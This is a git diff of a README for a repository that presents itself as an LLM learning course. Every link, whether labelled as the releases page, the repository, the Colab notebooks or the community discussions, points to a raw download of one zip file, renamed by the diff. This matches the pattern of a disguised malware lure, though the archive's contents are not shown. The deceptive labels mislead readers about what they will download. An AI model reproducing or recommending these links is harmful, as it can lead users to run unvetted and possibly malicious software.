@@ -2,7 +2,7 @@
 # 🌟 llm-course - Learn Large Language Models Easily
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip)
+[![Download](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **llm-course**! This course will guide you through the exciting world of Large Language Models (LLMs). You will find roadmaps and Colab notebooks designed to help you understand machine learning concepts easily.
@@ -15,7 +15,7 @@ Before you begin, ensure you have the following:
 - Ideally, a stable internet connection for optimal performance, especially while using Colab notebooks.
 
 ## 📥 Download & Install
-To download the course materials, visit this page to download: [Releases Page](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip).
+To download the course materials, visit this page to download: [Releases Page](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip).
 
 ### Steps to Download:
 1. Click on the link above to open the Releases page.
@@ -55,9 +55,9 @@ You can open issues on the GitHub repository or reach out through the discussion
 We will regularly update the course materials to include the latest information and tools in the field of LLMs. Check back often for new releases.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip)
-- [Colab Notebooks](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip)
-- [Community Discussions](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/llm-course.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip)
+- [Colab Notebooks](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip)
+- [Community Discussions](https://raw.githubusercontent.com/LaLy574/llm-course/main/doughhead/course_llm_v2.2.zip)
 
 ## ⚙️ Contribution
 If you would like to contribute to this course, please open an issue or submit a pull request. We welcome suggestions and improvements.
